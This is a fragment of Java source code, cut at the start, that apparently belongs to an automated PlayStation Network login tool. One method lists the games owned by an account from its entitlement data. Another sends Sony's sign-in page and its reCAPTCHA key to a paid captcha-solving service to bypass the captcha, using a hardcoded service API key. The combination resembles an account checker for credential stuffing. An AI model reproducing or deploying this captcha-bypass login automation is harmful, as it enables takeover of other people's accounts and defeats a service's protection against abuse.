			  			.compareToIgnoreCase("PS4GD") == 0;
			}catch(JSONException e) {}
			
			if(isAGame 
              			&& checkIfPurchased(
	              			entitlement.getString("sku_id"),
	              			checkedProductIds)
					) {
				
				String gameTitle = entitlement
                		.getJSONObject("game_meta")
                		.getString("name");
				
				accountGames += gameTitle + "\n";
			}
          }
          return accountGames;

      } catch (Exception e) {
          DebugHelper.out("JSON parse problem: " + e.getMessage(), DebugHelper.Type.ERROR);
          return "";
      }

  }
  
  private static String resolveWithAnticaptcha() throws MalformedURLException, InterruptedException {
      DebugHelper.setVerboseMode(true);

      NoCaptchaProxyless api = new NoCaptchaProxyless();
      api.setClientKey("466410a2abec5e57da541ed2cf603657");
      api.setWebsiteUrl(new URL(
              "https://id.sonyentertainmentnetwork.com/signin/?response_type=code&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fen-us%2Fhome%2Fgames&client_id=71a7beb8-f21a-47d9-a604-2e71bee24fe0&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&prompt=login&state=returning&request_locale=en_US&service_entity=urn%3Aservice-entity%3Apsn&hidePageElements=SENLogo&disableLinks=SENLink&ui=pr&error=login_required&error_code=4165&error_description=User+is+not+authenticated#/signin?entry=%2Fsignin"));
      api.setWebsiteKey("6Le-UyUUAAAAAIqgW-LsIp5Rn95m_0V0kt_q0Dl5");

      if (!api.createTask()) {
          DebugHelper.out("API v2 send failed. " + api.getErrorMessage(), DebugHelper.Type.ERROR);
      } else if (!api.waitForResult()) {
          DebugHelper.out("Could not solve the captcha.", DebugHelper.Type.ERROR);
      } else {
          DebugHelper.out("Result: " + api.getTaskSolution().getGRecaptchaResponse(), DebugHelper.Type.SUCCESS);
          return api.getTaskSolution().getGRecaptchaResponse();
      }
      return null;
  }
    
}

class RecaptchaSolvingError extends Exception{
	RecaptchaSolvingError() {
		super("A problem occured during recaptcha solving");
	}
}